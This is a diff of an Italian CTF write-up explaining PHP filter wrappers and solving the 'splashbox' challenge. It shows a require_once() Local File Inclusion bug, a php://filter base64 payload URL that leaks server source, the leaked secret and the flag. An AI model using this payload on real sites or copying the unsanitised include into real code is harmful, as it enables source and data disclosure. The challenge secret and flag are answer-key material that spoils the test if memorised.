@@ -1,19 +1,26 @@
 In ambito di sicurezza informatica e CTF, un PHP Filter è un meccanismo (chiamato "wrapper") che permette di manipolare un flusso di dati (stream) mentre viene letto o scritto.
-
 Il wrapper più utilizzato per gli attacchi è php://filter. Invece di far leggere a PHP un file normalmente, gli diciamo di applicare una trasformazione (un "filtro") al contenuto prima che ci venga consegnato.
-
-
 Il sito presentava una vulnerabilità di Local File Inclusion (LFI) nel parametro page della pagina principale. Il codice caricava i file utilizzando la funzione require_once() senza alcuna sanitizzazione dell'input:
 
 PHP
 if (isset($_GET["page"])) {
     require_once($_GET["page"] . ".php");
 }
+
 Sfruttamento (L'attacco)
 Invece di navigare normalmente nel sito, ho utilizzato il wrapper PHP Filter per leggere il codice sorgente dei file lato server. Questo permette di bypassare l'esecuzione del codice PHP e riceverlo codificato in Base64.
 
 
 http://splashbox.challs.olicyber.it/?page=php://filter/convert.base64-encode/resource=flag usando questo mi da il secret e e poi andando su 
+<?php
+    $flag = $_ENV["FLAG2"];
+    if (isset($_GET["secret"]) && $_GET["secret"] === "69a606d6c503293b7b7c593fe2694224"){
+        echo "<h2>$flag<h2>";
+    } else {
+        echo "<h2>UNAUTHORIZED!!!!</h2>";
+    }
+?>
+
 http://splashbox.challs.olicyber.it/?page=flag&secret=69a606d6c503293b7b7c593fe2694224 mi esce la flag
 
 flag{f1ltr0_1nst4gr4m_3_c1t4z10n3_d1_Bibb0wski}
